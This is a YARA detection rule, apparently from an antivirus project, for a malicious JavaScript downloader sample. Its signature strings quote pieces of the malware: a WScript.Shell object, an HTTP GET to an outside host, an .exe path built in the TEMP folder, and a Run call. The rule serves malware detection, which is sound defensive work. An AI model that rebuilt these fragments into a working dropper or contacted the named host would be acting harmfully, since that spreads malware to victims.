rule sig_20160330_83db4b4c6d66014d225dc5486a653d34 {
  meta:
    description = "datamaliciousorder - file 20160330_83db4b4c6d66014d225dc5486a653d34.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "02600fa3bf2ee1579a7485ac48c73a455c65f7b9ebd11af671f087ceff75b687"

  strings:
    $s1  = "function A(FA, V0){S0 = S0 * 1; return FA - V0;};" fullword ascii
    $s2  = "var N = function UN() {return WScript[GF](\"WScript\"+\".Shell\");}(), E = 11;" fullword ascii
    $s3  = "Q0[W](\"GET\", \"http://vtdrive.kz/f6dh1a\", false);" fullword ascii
    $s4  = "if (Q0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function Z() {return N[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"sW5OhdDxHBMHJnD.ex\" + \"e\";};" fullword ascii
    $s6  = "function X(){return ME + \"\";};" fullword ascii
    $s7  = "function HI() {return ((JB == true) && (JB == G0)) ? 1 : S0;};" fullword ascii
    $s8  = "function DG(D){N[\"Run\"](D, S0, S0);};" fullword ascii
    $s9  = "function S()" fullword ascii
    $s10 = "function Q(){return 22;};" fullword ascii
    $s11 = "var G = new this[\"Date\"]();" fullword ascii
    $s12 = "}while (U);" fullword ascii
    $s13 = "return A(D0, I);" fullword ascii
    $s14 = "function QV(LT) {var ZW = (1, 2, 3, 4, 5, LT); return ZW;};" fullword ascii
    $s15 = "function NB(){return GF;};" fullword ascii
    $s16 = "var P = false;" fullword ascii
    $s17 = "var G0 = false;" fullword ascii
    $s18 = "var JB = false;" fullword ascii
    $s19 = "JB = true; " fullword ascii
    $s20 = "G0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}